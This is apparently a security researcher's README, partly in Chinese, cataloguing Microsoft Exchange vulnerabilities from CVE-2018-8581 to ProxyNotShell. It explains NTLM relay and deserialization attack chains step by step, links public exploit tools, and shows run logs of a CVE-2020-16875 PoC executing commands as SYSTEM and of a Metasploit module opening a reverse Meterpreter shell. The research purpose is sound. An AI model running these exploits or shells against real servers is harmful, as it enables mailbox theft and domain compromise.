# Proxy-Attackchain

proxylogon & proxyshell & proxyoracle & proxytoken & all exchange server history vulns summarization :)

1. ProxyLogon: The most well-known and impactful Exchange exploit chain
2. ProxyOracle: The attack which could recover any password in plaintext format of Exchange users
3. ProxyShell: The exploit chain demonstrated at [Pwn2Own 2021](https://twitter.com/thezdi/status/1379467992862449664) to take over Exchange and earn $200,000 bounty

ProxyLogon is Just the Tip of the Iceberg: A New Attack Surface on Microsoft Exchange Server! [Slides](https://i.blackhat.com/USA21/Wednesday-Handouts/us-21-ProxyLogon-Is-Just-The-Tip-Of-The-Iceberg-A-New-Attack-Surface-On-Microsoft-Exchange-Server.pdf) [Video](https://www.youtube.com/watch?v=5mqid-7zp8k)

 - ![](./pics/logo-black.png)

| NAME | CVE | patch time | description | avaliable |
| ----------- | ----------- | ----------- | ----------- | ----------- |
| CVE-2018-8581 (completed) | [CVE-2018-8581](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2018-8581) | Jan 3, 2019 | Microsoft Exchange Server SSRF Elevation of Privilege Vulnerability | yes |
| CVE-2018-8302 (completed) | [CVE-2018-8302](https://msrc.microsoft.com/update-guide/en-US/advisory/CVE-2018-8302) | Aug 16, 2018 | Microsoft Exchange Memory Corruption Vulnerability | yes |
| CVE-2019-1019 (暂无域环境) | [CVE-2019-1019](https://msrc.microsoft.com/update-guide/en-US/advisory/CVE-2019-1019) | Jun 11, 2019 | Microsoft Windows suffers from an HTTP to SMB NTLM reflection that leads to a privilege escalation. | yes |
| CVE-2019-1040 (暂无域环境) | [CVE-2019-1040](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2019-1040) | Jun 11, 2019 | Windows NTLM Tampering Vulnerability | yes |
| CVE-2019-1166 (暂无域环境) | [CVE-2019-1166](https://msrc.microsoft.com/update-guide/en-US/advisory/CVE-2019-1166) | Oct 8, 2019 | Windows NTLM Tampering Vulnerability | yes |
| CVE-2019-1373 | [CVE-2019-1373](https://msrc.microsoft.com/update-guide/en-US/advisory/CVE-2019-1373) | Nov 12, 2019 | Microsoft Exchange Remote Code Execution Vulnerability | yes |
| CVE-2020-0688 (completed) | [CVE-2020-0688](https://msrc.microsoft.com/update-guide/en-US/advisory/CVE-2020-0688) | Feb 11, 2020 | Microsoft Exchange Validation Key Remote Code Execution Vulnerability | yes |
| CVE-2020-16875 (completed) [youtube demo](https://www.youtube.com/watch?v=HZ20U4VW2wA) | [CVE-2020-16875](https://msrc.microsoft.com/update-guide/en-US/advisory/CVE-2020-16875) | Sep 8, 2020 | Microsoft Exchange Server DlpUtils AddTenantDlpPolicy Remote Code Execution | yes |
| CVE-2020-17132 (completed) [youtube demo](https://www.youtube.com/watch?v=S9S2YChZK7k) | [CVE-2020-17132](https://msrc.microsoft.com/update-guide/en-US/advisory/CVE-2020-17132) | Dec 8, 2020 | Microsoft Exchange Server DlpUtils AddTenantDlpPolicy Remote Code Execution CVE-2020-16875 bypass | yes |
| CVE-2020-17083(completed) [youtube demo](https://www.youtube.com/watch?v=fVoTnd1tBMc) | [CVE-2020-17083](https://msrc.microsoft.com/update-guide/en-us/advisory/CVE-2020-17083) | Nov 10, 2020 | Microsoft Exchange Server Remote Code Execution Vulnerability | yes |
| CVE-2020-17143 | [CVE-2020-17143]() |  |  | yes |
| CVE-2020-17144 | [CVE-2020-17144]() |  |  | yes |
| CVE-2021-24085 | [CVE-2021-24085](https://msrc.microsoft.com/update-guide/en-US/advisory/CVE-2021-24085) | Feb 9, 2021 | An authenticated attacker can leak a cert file which results in a CSRF token to be generated. | yes |
| CVE-2021-28482 | [CVE-2021-28482]() |  |  | yes |
| ProxyLogon (completed) [youtube demo](https://www.youtube.com/watch?v=KoGodxigujA) | [CVE-2021-26855](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-26855) | Mar 02, 2021 | server-side request forgery (SSRF) | yes |
| ProxyLogon (completed) [youtube demo](https://www.youtube.com/watch?v=KoGodxigujA) | [CVE-2021-27065](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-27065) | Mar 02, 2021 | Microsoft.Exchange.Management.DDIService.WriteFileActivity未校验写文件后缀，可由文件内容部分可控的相关功能写入WebShell | yes |
| ProxyOracle (completed) | [CVE-2021-31196](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-31196) | Jul 13, 2021 | Reflected Cross-Site Scripting | yes |
| ProxyOracle (completed) | [CVE-2021-31195](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-31195) | May 11, 2021 | Padding Oracle Attack on Exchange Cookies Parsing | yes |
| ProxyShell (completed) | [CVE-2021-34473](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34473) | Apr 13, 2021 | Pre-auth Path Confusion leads to ACL Bypass | yes |
| ProxyShell (completed) | [CVE-2021-34523](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34523) | Apr 13, 2021 | Elevation of Privilege on Exchange PowerShell Backend | yes |
| ProxyShell (completed) | [CVE-2021-31207](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-31207) | May 11, 2021 | Post-auth Arbitrary-File-Write leads to RCE | yes |
| proxytoken (completed) | [CVE-2021-33766](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-33766) | July 13, 2021 | With this vulnerability, an unauthenticated attacker can perform configuration actions on mailboxes belonging to arbitrary users. As an illustration of the impact, this can be used to copy all emails addressed to a target and account and forward them to an account controlled by the attacker. | yes |
| Microsoft Exchange Server 远程执行代码漏洞 (completed) | [CVE-2021-42321](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-42321) | Nov 17, 2021 | Exchange Deserialization RCE | yes |
| ProxyRelay (暂无域环境) | [CVE-2021-33768](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-33768) | July 13, 2021 | Relay to Exchange FrontEnd | yes |
| ProxyRelay (暂无域环境) | [CVE-2022-21979](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2022-21979) | October 11, 2022 | Relay to Exchange BackEnd | yes |
| ProxyRelay (暂无域环境) | [CVE-2021-26414](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-26414) | June 8, 2021 | Relay to Exchange DCOM | yes |
| ProxyNotShell (completed) | [CVE-2022-41040](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2022-41040) | 2022年11月8日 | 服务端请求伪造(SSRF)漏洞 | yes |
| ProxyNotShell (completed) | [CVE-2022-41082](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2022-41082) | 2022年11月8日 | 远程执行代码RCE漏洞 | yes |
| ProxyNotRelay |  |  |  | yes |
| CVE-2022-21969 | [CVE-2022-21969](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2022-21969) | Jan 11, 2022 | Deserialization Protection Bypasses RCE | yes |
| OWASSRF(CVE-2022-41080) | [CVE-2022-41080]() |  |  | yes |
| TabShell(CVE-2022-41076) | [CVE-2022-41076]() |  |  | yes |
| CVE-2022-23277 (completed) | [CVE-2022-23277](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2022-23277) | Mar 8, 2022 | 由于SerializationBinder的错误使用导致反序列化白名单的绕过，从而实现认证后RCE。触发漏洞的功能与CVE-2021-42321一致 | yes |
| ProxyNotFound | [CVE-2021-28480](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-28480) | April 13, 2021 | Pre-auth SSRF/ACL bypass | no |
| ProxyNotFound | [CVE-2021-28481](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-28481) | April 13, 2021 | Pre-auth SSRF/ACL bypass | no |
| CVE-2023-21707 (暂无域环境) | [CVE-2023-21707](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-21707) | 2023年3月9日 | Microsoft Exchange Server 远程执行代码漏洞 | yes |
| proxymaybeshell (completed) | [proxymaybeshell](https://mp.weixin.qq.com/s/mvc-HS1nB2rWzWHLBkYz2A) | 2023年9月15日 | proxyshell ssrf + proxynotshell伪造X-Rps-CAT token | yes |

 - 所有exchange server的iso镜像版本CU及安全更新补丁SU信息均可在以下microsoft官网查询和下载到

 - [Exchange Server build numbers and release dates](https://learn.microsoft.com/en-us/exchange/new-features/build-numbers-and-release-dates?view=exchserver-2019)

# CVE-2018-8581 (completed)
## CVE-2018-8581 part links

 - 漏洞影响的exchange版本信息

``` bash
早期Exchange 2010、Exchange 2013、Exchange 2016
```

复现环境推荐：

``` bash
操作系统windows2008 + Exchange2010SP2
exchange 2013 sp1 + windows 2012
```

这是一个邮箱层面的横向渗透和提权漏洞，NTLM RELAY代表性的经典漏洞，它可以在拥有了一个普通权限邮箱账号密码后，完成对其他用户(包括域管理员)邮箱收件箱的委托接管

该漏洞实质是由SSRF （Server-Side Request Forgery：服务器端请求伪造）漏洞和其他通信机制相结合造成的。Exchange允许任何用户为推送订阅指定所需的URL，服务器将尝试向这个URL发送通知，漏洞存在于Exchange服务器使用CredentialCache.DefaultCredentials进行连接的场景。

现实利用场景中攻击者只需拥有合法Exchange邮箱账户，只要向Exchange Server所在的主机发送精心构造的恶意数据包，触发漏洞导致向受害者邮箱中添加入站(inbond)规则，之后受害者的所有入站(inbond)电子邮件都将转发给攻击者。由于攻击发生在攻击者和服务器之间，故大多数情况下受害者几乎是无感知的。

在Exchange Web Service(EWS)中，CredentialCache.DefaultCredentials运行在NT AUTHORITYSYSTEM权限之上。这将导致Exchange Server向攻击者的服务器发送NTLM hash。允许使用这些NTLM hash来进行HTTP身份验证。

 - ![](./pics/CVE-2018-8581.jpg)

现在可以使用这些hash来访问Exchange Web Service(EWS)。由于它运行在NT AUTHORITY/SYSTEM级别，攻击者可以获得TokenSerializationRight的"特权"session。然后SOAP请求头存在的SSRF漏洞可以使其冒充任何用户，从而导致该提权漏洞的产生。

下面是一个SOAP报头的示例，它模拟了具有S-1-5-21-4187549019-2363330540-1546371449-500的SID的管理员用户:

 - ![](./pics/CVE-2018-8581-1.jpg)

攻击场景1: 攻击者利用此漏洞，以目标网络上的邮箱权限接管网络中任何人的收件箱，造成严重的信息泄露。

攻击场景2: 攻击者可利用此漏洞直接控制目标网络中的某个Windows域，控制该域内所有Windows计算机。

 - github 利用工具
 - [Exchange2domain](https://github.com/Ridter/Exchange2domain)
 - [CVE-2018-8581](https://github.com/WyAtu/CVE-2018-8581)
 - [ZDI adds PoC for CVE-2018-8581](https://github.com/thezdi/PoC/tree/master/CVE-2018-8581)

 - 网上原理及利用分析复现文章很多也很详细就不重复复现了
 - [AN INSINCERE FORM OF FLATTERY: IMPERSONATING USERS ON MICROSOFT EXCHANGE](https://www.zerodayinitiative.com/blog/2018/12/19/an-insincere-form-of-flattery-impersonating-users-on-microsoft-exchange)
 - [Microsoft Exchange – Privilege Escalation](https://pentestlab.blog/tag/cve-2018-8581/)
 - [Microsoft Exchange漏洞复现之CVE-2018-8581](https://www.cnblogs.com/devi1o/articles/13588854.html)
 - [Microsoft Exchange 任意用户伪造漏洞（CVE-2018-8581）分析](https://paper.seebug.org/804/)
 - [CVE-2018-8581复现](https://www.jianshu.com/p/e081082cbc73)
 - [MICROSOFT EXCHANGE任意用户伪造漏洞(CVE-2018-8581)复现](https://blog.dp7.xyz/post/CVE-2018-8581/)
 - [利用Exchange Server CVE-2018-8581+HASH传递玩爆AD](https://blog.51cto.com/mooing/2347487)
 - [Microsoft Exchange漏洞记录(撸向域控) - CVE-2018-8581](https://www.cnblogs.com/iamstudy/articles/Microsoft_Exchange_CVE-2018-8581.html?from=singlemessage)
 - [Exchange SSRF漏洞利用及分析](https://yoga7xm.top/2020/01/15/8581/)
 - [cve-2018-8581 youtube demo](https://www.youtube.com/watch?v=isy-QjJykss)

# CVE-2018-8302 (completed)
## CVE-2018-8302 part links

 - [Demonstrating CVE-2018-8302: A Microsoft Exchange Memory Corruption Vulnerability](https://www.youtube.com/watch?v=OIhxzof22JU)
 - [VOICEMAIL VANDALISM: GETTING REMOTE CODE EXECUTION ON MICROSOFT EXCHANGE SERVER](https://www.zerodayinitiative.com/blog/2018/8/14/voicemail-vandalism-getting-remote-code-execution-on-microsoft-exchange-server)

 - 影响版本: exchange <= Aug 14, 2018

当Microsoft Exchange软件无法正确处理内存中的对象时，导致远程代码执行漏洞。成功利用该漏洞的攻击者可以以System用户通过.NET BinaryFormatter反序列化在上下文中执行任意代码。然后攻击者可以安装程序;查看、更改或删除数据;或者创建新帐户。

利用该漏洞需要定制的电子邮件发送到易受攻击的Exchange服务器。配合UM和语音邮件钓鱼

# CVE-2019-1019 (暂无域环境)
## CVE-2019-1019 part links

 - [Near-Ubiquitous Microsoft RCE Bugs Affect All Versions of Windows](https://threatpost.com/critical-microsoft-rce-bugs-windows/145572/)
 - [Microsoft Windows 10.0.17134.648 - HTTP -> SMB NTLM Reflection Leads to Privilege Elevation](https://www.exploit-db.com/exploits/47115)


存在一个安全特性绕过漏洞，其中NETLOGON消息能够获取会话密钥并签名消息。

要利用此漏洞，攻击者可以发送特制的身份验证请求。成功利用此漏洞的攻击者可以使用原始用户权限访问另一台计算机。

# CVE-2019-1040 (暂无域环境)
## CVE-2019-1040 part links

 - [dcpwn](https://github.com/QAX-A-Team/dcpwn)
 - [CVE-2019-1040 with Exchange](https://github.com/Ridter/CVE-2019-1040)
 - [Exploiting CVE-2019-1040 - Combining relay vulnerabilities for RCE and Domain Admin](https://dirkjanm.io/exploiting-CVE-2019-1040-relay-vulnerabilities-for-rce-and-domain-admin/)
 - [CVE-2019-1040-dcpwn](https://github.com/Ridter/CVE-2019-1040-dcpwn)
 - [UltraRelay Updated by Lazaar Sami for the exploit CVE-2019-1040](https://github.com/lazaars/UltraRealy_with_CVE-2019-1040)
 - [CVE-2019-1040](https://www.heresecurity.wiki/heng-xiang-yi-dong/ntlm-zhong-ji-he-zhong-jian-ren-gong-ji/cve-2019-1040)
 - [CVE-2019-1040: Relaying SMB to LDAP - Demo](https://www.youtube.com/watch?v=86EFtshy4xU)
 - [内网大杀器利用：CVE-2019-1040漏洞](https://www.anquanke.com/post/id/180379/)
 - [CVE-2019-1040配合打印机漏洞实现攻击主域控进行资源委派攻击辅助域控](https://www.cnblogs.com/zpchcbd/p/15857942.html)
 - [结合CVE-2019-1040漏洞的两种域提权深度利用分析](https://cloud.tencent.com/developer/article/1987720)
 - [委派攻击知识点全收录！利用委派的姿势能有多花哨？ | 技术精选 0121](https://mp.weixin.qq.com/s/GdmnlsKJJXhElA4GuwxTKQ)
 - [CVE-2019-1040漏洞分析学习](https://blog.csdn.net/qq_43645782/article/details/119672072)
 - [Cve 2019 1040 Intranet Killer](https://syst1m.com/post/cve-2019-1040-intranet-killer/)
 - [域环境搭建，CVE-2019-1040 原理及复现](http://www.sanyuee.top/index.php/archives/545/)

 - ntlm relay攻击及域渗透相关技术原理深入

 - [Derbycon - The Unintended Risks of Trusting Active Directory](https://www.slideshare.net/harmj0y/derbycon-the-unintended-risks-of-trusting-active-directory)
 - [The worst of both worlds: Combining NTLM Relaying and Kerberos delegation](https://dirkjanm.io/worst-of-both-worlds-ntlm-relaying-and-kerberos-delegation/)
 - [Abusing Exchange: One API call away from Domain Admin](https://dirkjanm.io/abusing-exchange-one-api-call-away-from-domain-admin/)
 - [Another Word on Delegation](https://posts.specterops.io/another-word-on-delegation-10bdbe3cd94a)
 - [mitm6 – compromising IPv4 networks via IPv6](https://blog.fox-it.com/2018/01/11/mitm6-compromising-ipv4-networks-via-ipv6/)
 - [Wagging the Dog: Abusing Resource-Based Constrained Delegation to Attack Active Directory](https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html)
 - ["Relaying" Kerberos - Having fun with unconstrained delegation](https://dirkjanm.io/krbrelayx-unconstrained-delegation-abuse-toolkit/)
 - [Escalating privileges with ACLs in Active Directory](https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/)
 - [Relaying credentials everywhere with ntlmrelayx](https://blog.fox-it.com/2017/05/09/relaying-credentials-everywhere-with-ntlmrelayx/)
 - [D2T2 - NTLM Relay Is Dead Long Live NTLM Relay - Jianing Wang and Junyu Zhou](./research-pdfs/D2T2%20-%20NTLM%20Relay%20Is%20Dead%20Long%20Live%20NTLM%20Relay%20-%20Jianing%20Wang%20and%20Junyu%20Zhou.pdf)
 - [An ACE Up the Sleeve: Designing Active Directory DACL Backdoors](./research-pdfs/us-17-Robbins-An-ACE-Up-The-Sleeve-Designing-Active-Directory-DACL-Backdoors-wp.pdf)
 - [Toxic Waste Removal for Active Directory](./research-pdfs/04262018-Webcast-Toxic-Waste-Removal-by-Andy-Robbins.pdf)
 - [aclpwn - Active Directory ACL exploitation with BloodHound](https://www.slideshare.net/DirkjanMollema/aclpwn-active-directory-acl-exploitation-with-bloodhound)
 - [Remote NTLM relaying through meterpreter on Windows port 445](https://diablohorn.com/2018/08/25/remote-ntlm-relaying-through-meterpreter-on-windows-port-445/)
 - [NTLM Relay](https://en.hackndo.com/ntlm-relay/)
 - [Relay](https://www.thehacker.recipes/a-d/movement/ntlm/relay)
 - [MITM and coerced auths](https://www.thehacker.recipes/a-d/movement/mitm-and-coerced-authentications)
 - [rough PoC to connect to spoolss to elicit machine account authentication](https://gist.github.com/3xocyte/cfaf8a34f76569a8251bde65fe69dccc)
 - [Kerberos unconstrained delegation abuse toolkit](https://github.com/dirkjanm/krbrelayx)
 - [NTLM Relay](https://wuhash.gitee.io/2020-09-01.html)


当中间人攻击者能够成功绕过NTLM MIC(消息完整性检查)保护时，Microsoft Windows中存在篡改漏洞。成功利用此漏洞的攻击者可以获得降级NTLM安全特性的能力。

要利用此漏洞，攻击者需要篡改NTLM exchange。然后，攻击者可以修改NTLM报文的flag，而不会使签名失效。

CVE-2019-1040 漏洞使得修改 NTLM 身份验证数据包而不会使身份验证失效，从而使攻击者能够删除阻止从 SMB 中继到 LDAP 的flag

### 攻击域Exchange Server/管理员

 - 前提条件

A、Exchange服务器可以是任何版本（包括为PrivExchange修补的版本）。唯一的要求是，在以共享权限或RBAC模式安装时，Exchange默认具有高权限。

B、域内任意账户。（由于能产生SpoolService错误的唯一要求是任何经过身份验证的域内帐户）

C、CVE-2019-1040漏洞的实质是NTLM数据包完整性校验存在缺陷，故可以修改NTLM身份验证数据包而不会使身份验证失效。而此攻击链中攻击者删除了数据包中阻止从SMB转发到LDAP的标志。

D、构造请求使Exchange Server向攻击者进行身份验证，并通过LDAP将该身份验证中继到域控制器，即可使用中继受害者的权限在Active Directory中执行操作。比如为攻击者帐户授予DCSync权限。

E、如果在可信但完全不同的AD林中有用户，同样可以在域中执行完全相同的攻击。（因为任何经过身份验证的用户都可以触发SpoolService反向连接）

 - 漏洞利用攻击链

1、使用域内任意帐户，通过SMB连接到被攻击ExchangeServer，并指定中继攻击服务器。同时必须利用SpoolService错误触发反向SMB链接。

2、中继服务器通过SMB回连攻击者主机，然后利用ntlmrelayx将利用CVE-2019-1040漏洞修改NTLM身份验证数据后的SMB请求据包中继到LDAP。

3、使用中继的LDAP身份验证，此时Exchange Server可以为攻击者帐户授予DCSync权限。

4、攻击者帐户使用DCSync转储AD域中的所有域用户密码哈希值（包含域管理员的hash，此时已拿下整个域）。

### 攻击域AD Server/管理员

 - 前提条件

A、服务器可以是任何未修补的Windows Server或工作站，包括域控制器。在定位域控制器时，至少需要一个易受攻击的域控制器来中继身份验证，同时需要在域控制器上触发SpoolService错误。

B、需要控制计算机帐户。这可以是攻击者从中获取密码的计算机帐户，因为他们已经是工作站上的Administrator或攻击者创建的计算机帐户，滥用Active Directory中的任何帐户都可以默认创建这些帐户。

C、CVE-2019-1040漏洞的实质是NTLM数据包完整性校验存在缺陷，故可以修改NTLM身份验证数据包而不会使身份验证失效。而此攻击链中攻击者删除了数据包中阻止从SMB转发到LDAP的标志。

D、通过滥用基于资源的约束Kerberos委派，可以在AD域控服务器上授予攻击者模拟任意域用户权限。包括域管理员权限。

E、如果在可信但完全不同的AD林中有用户，同样可以在域中执行完全相同的攻击。（因为任何经过身份验证的用户都可以触发SpoolService反向连接）

 - 漏洞利用攻击链

1、使用域内任意帐户，通过SMB连接到被攻击域控服务器，并指定中继攻击服务器。同时必须利用SpoolService错误触发反向SMB链接。

2、中继服务器通过SMB回连攻击者主机，然后利用ntlmrelayx将利用CVE-2019-1040漏洞修改NTLM身份验证数据后的SMB请求据包中继到LDAP。

3、使用中继的LDAP身份验证，将受害者服务器的基于资源的约束委派权限授予攻击者控制下的计算机帐户。

4、攻击者现在可以作为AD服务器上的任意用户进行身份验证。包括域管理员。

 - 影响版本:

``` bash
Windows 10 for 32-bit Systems
Windows 10 for x64-based Systems
Microsoft Windows 10 Version 1607 for 32-bit Systems
Microsoft Windows 10 Version 1607 for x64-based Systems
Microsoft Windows 10 version 1703 for 32-bit Systems
Microsoft Windows 10 version 1703 for x64-based Systems
Microsoft Windows 10 version 1709 for 32-bit Systems
Microsoft Windows 10 Version 1709 for ARM64-based Systems
Windows 10 Version 1709 for x64-based Systems
Microsoft Windows 10 Version 1803 for 32-bit Systems
Microsoft Windows 10 Version 1803 for ARM64-based Systems
Microsoft Windows 10 Version 1803 for x64-based Systems
Windows 10 Version 1809 for 32-bit Systems
Windows 10 Version 1809 for ARM64-based Systems
Windows 10 Version 1809 for x64-based Systems
Windows 10 Version 1903 for 32-bit Systems
Windows 10 Version 1903 for ARM64-based Systems
Windows 10 Version 1903 for x64-based Systems
Windows 7 for 32-bit Systems Service Pack 1
Windows 7 for x64-based Systems Service Pack 1
Windows 8.1 for 32-bit systems
Windows 8.1 for x64-based systems
Microsoft Windows RT 8.1
Windows Server 2008 for 32-bit Systems Service Pack 2
Windows Server 2008 for 32-bit Systems Service Pack 2 (Server Core installation)
Windows Server 2008 for Itanium-Based Systems Service Pack 2
Windows Server 2008 for x64-based Systems Service Pack 2
Windows Server 2008 for x64-based Systems Service Pack 2 (Server Core installation)
Windows Server 2008 R2 for Itanium-Based Systems Service Pack 1
Windows Server 2008 R2 for x64-based Systems Service Pack 1
Windows Server 2008 R2 for x64-based Systems Service Pack 1 (Server Core installation)
Windows Server 2012
Windows Server 2012 (Server Core installation)
Windows Server 2012 R2
Windows Server 2012 R2 (Server Core installation)
Microsoft Windows Server 2016
Windows Server 2016 (Server Core installation)
Microsoft Windows Server 2019
Windows Server 2019 (Server Core installation)
Windows Server
version 1803 (Server Core Installation)
Windows Server
version 1903 (Server Core installation)
```

# CVE-2019-1166 (暂无域环境)
## CVE-2019-1166 part links

 - [drop-the-mic-2-active-directory-open-to-more-ntlm-attacks](https://www.preempt.com/blog/drop-the-mic-2-active-directory-open-to-more-ntlm-attacks/)
 - [Active Directory Open to More NTLM Attacks: Drop The MIC 2 (CVE 2019-1166) and Exploiting LMv2 Clients (CVE-2019-1338)](https://www.crowdstrike.com/blog/active-directory-ntlm-attack-security-advisory/)

# CVE-2019-1373
## CVE-2019-1373 part links

网上基本无公开细节资料

# CVE-2020-0688 (completed)
## CVE-2020-0688 part links

 - [CVE-2020-0688-Exchange-远程代码执行分析及复现](https://fdlucifer.github.io/2020/10/12/cve-2020-0688/)
 - [github cve-2020-0688 武器化工具](https://github.com/search?q=CVE-2020-0688&type=repositories)
 - [DotNet安全-ViewState反序列化利用](https://mp.weixin.qq.com/s/UGFu7zLDUMaCGNYlYm3WRw)
 - [Hunting Down MS Exchange Attacks. Part 2 (CVE-2020-0688, CVE-2020-16875, CVE-2021-24085)](https://cyberpolygon.com/materials/okhota-na-ataki-ms-exchange-chast-2-cve-2020-0688-cve-2020-16875-cve-2021-24085/)
 - [CVE-2020-0688: REMOTE CODE EXECUTION ON MICROSOFT EXCHANGE SERVER THROUGH FIXED CRYPTOGRAPHIC KEYS](https://www.zerodayinitiative.com/blog/2020/2/24/cve-2020-0688-remote-code-execution-on-microsoft-exchange-server-through-fixed-cryptographic-keys)
 - [exploit-db Microsoft Exchange 2019 15.2.221.12 - Authenticated Remote Code Execution](https://www.exploit-db.com/exploits/48153)
 - [Exchange Exploit Case Study – CVE-2020-0688](https://community.netwitness.com/t5/netwitness-community-blog/exchange-exploit-case-study-cve-2020-0688/ba-p/517916)
 - [CVE-2020-0688的武器化与.net反序列化漏洞那些事](https://www.zcgonvh.com/post/weaponizing_CVE-2020-0688_and_about_dotnet_deserialize_vulnerability.html)
 - [【实战篇】记一次CVE-2020-0688的漏洞利用](https://www.modb.pro/db/143283)
 - [Exploiting ViewState Deserialization using Blacklist3r and YSoSerial.Net](https://notsosecure.com/exploiting-viewstate-deserialization-using-blacklist3r-and-ysoserial-net)
 - [Deep Dive into .NET ViewState deserialization and its exploitation](https://swapneildash.medium.com/deep-dive-into-net-viewstate-deserialization-and-its-exploitation-54bf5b788817)

 - 漏洞影响的exchange版本信息

``` bash
MS Exchange Server 2010 SP3 up to 2019 CU4
```

该模块利用了Exchange控制面板(ECP)中的.net序列化漏洞。该漏洞是由于Microsoft Exchange Server没有在每次安装的基础上随机化密钥，导致它们使用相同的validationKey和decryptionKey值。有了这些值，攻击者可以制作一个特殊的ViewState，使用.net反序列化NT_AUTHORITY\SYSTEM来执行操作系统命令。

viewstate 的反序列化，成为第一个能直接在 exchange 服务器上执行命令的漏洞，所以漏洞刚出时影响非常大且很有代表性

网上分析文章也多，还有很多开源的武器化实现，就不过多写了

# CVE-2020-16875 (completed)
## CVE-2020-16875 part links

 - [Microsoft Exchange Server DlpUtils AddTenantDlpPolicy Remote Code Execution](https://packetstormsecurity.com/files/159210/Microsoft-Exchange-Server-DlpUtils-AddTenantDlpPolicy-Remote-Code-Execution.html)
 - [CVE-2020-16875 python poc](https://srcincite.io/pocs/cve-2020-16875.py.txt)
 - [CVE-2020-16875 powershell poc](https://srcincite.io/pocs/cve-2020-16875.ps1.txt)
 - [CVE-2020-16875：Microsoft Exchange RCE复现](https://cloud.tencent.com/developer/article/1704777)
 - [Exchange漏洞分析系列 CVE-2020-16875](https://www.anquanke.com/post/id/219091)
 - [metasploit exchange_ecp_dlp_policy.rb](https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/windows/http/exchange_ecp_dlp_policy.rb)
 - [Making Clouds Rain :: Remote Code Execution in Microsoft Office 365](https://srcincite.io/blog/2021/01/12/making-clouds-rain-rce-in-office-365.html)

 - 影响exchange版本: Exchange Server <= 2016 CU19 and 2019 CU8 (December 2020 updates)
 - 原公开日期: 2020-09-08
 - 最新补丁bypass发布日期: 2021-01-12

此漏洞允许远程攻击者在受影响的Exchange Server上执行任意代码。利用此漏洞需要身份验证。此外，目标用户必须具有分配的"数据丢失防护"角色和活动邮箱。如果用户处于"合规管理"或更高级的"组织管理"角色组中，则他们具有"数据丢失预防"角色。由于安装Exchange的用户处于"组织管理"角色组中，因此他们过渡地具有"数据丢失预防"角色。具体的缺陷存在于New-DlpPolicy命令的处理过程中。这个问题是由于在创建DLP策略时缺乏对用户提供的模板数据的适当验证造成的。攻击者可以利用此漏洞以SYSTEM权限执行代码。

 - 本地测试exchange环境

| 测试状态 | exchange版本 | File Name | 出版日期 | File Size |
| ----------- | ----------- | ----------- | ----------- | ----------- |
| 测试成功 | Exchange Server 2016 累计更新 CU17(KB4556414) 15.01.2044.004 | ExchangeServer2016-x64-cu17.iso | 2020/6/12 | 6.6 GB |

被攻击的exchange用户需要有"Data Loss Prevention"角色分配，如果通过ecp接口(此poc)执行攻击，则用户将需要一个可用的邮箱.

``` bash
New-RoleGroup -Name "dlp users" -Roles "Data Loss Prevention" -Members "harrym"
```

 - ![](./pics/cve-2020-16875.png)

``` bash
Get-RoleGroup "dlp users" | Format-List
```

 - ![](./pics/cve-2020-16875-1.png)

1. python poc

 - [cve-2020-16875.py](./CVE-2020-16875/cve-2020-16875.py)

具体攻击请求流程在poc中写的很清楚，就不过多分析了，成功以system权限执行命令

``` bash
(base) D:\1.recent-research\exchange\proxy-attackchain\CVE-2020-16875>python cve-2020-16875.py 192.168.14.6 administrator@exchange2016.com:xxxxxx mspaint
(+) logged in as administrator@exchange2016.com
(+) found the __viewstate: /wEPDwUILTg5MDAzMDFkZPMgRmGb/6MPD4JaqGioF1vSUbmaOqIkWGNUIP6TVhRU
(+) executed mspaint as SYSTEM!
```

 - ![](./pics/cve-2020-16875-2.png)

 - ![](./pics/cve-2020-16875-3.png)

2. powershell poc

 - [cve-2020-16875.ps1](./CVE-2020-16875/cve-2020-16875.ps1)

这个脚本使用Kerberos认证请求PowerShell端，要在域内使用

3. metasploit exchange_ecp_dlp_policy 模块

``` bash
msf6 exploit(windows/http/exchange_ecp_dlp_policy) > run

[*] Started HTTPS reverse handler on https://192.168.123.1:8443
[*] Executing automatic check (disable AutoCheck to override)
[!] The service is running, but could not be validated. OWA is running at https://192.168.123.192/owa/
[*] Logging in to OWA with creds Administrator:Passw0rd!
[+] Successfully logged in to OWA
[*] Retrieving ViewState from DLP policy creation page
[+] Successfully retrieved ViewState
[*] Creating custom DLP policy from malicious template
[*] DLP policy name: Abbotstone Agricultural Property Unit Trust Data
[*] Powershell command length: 2372
[*] https://192.168.123.1:8443 handling request from 192.168.123.192; (UUID: rwlz4ahe) Staging x64 payload (201308 bytes) ...
[*] Meterpreter session 1 opened (192.168.123.1:8443 -> 192.168.123.192:6951) at 2020-09-16 02:39:17 -0500

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter > sysinfo
Computer        : WIN-365Q2VJJS17
OS              : Windows 2016+ (10.0 Build 14393).
Architecture    : x64
System Language : en_US
Domain          : GIBSON
Logged On Users : 8
Meterpreter     : x64/windows
meterpreter >
```

# CVE-2020-17132 (completed)
## CVE-2020-17132 part links

 - [Making Clouds Rain :: Remote Code Execution in Microsoft Office 365](https://srcincite.io/blog/2021/01/12/making-clouds-rain-rce-in-office-365.html)
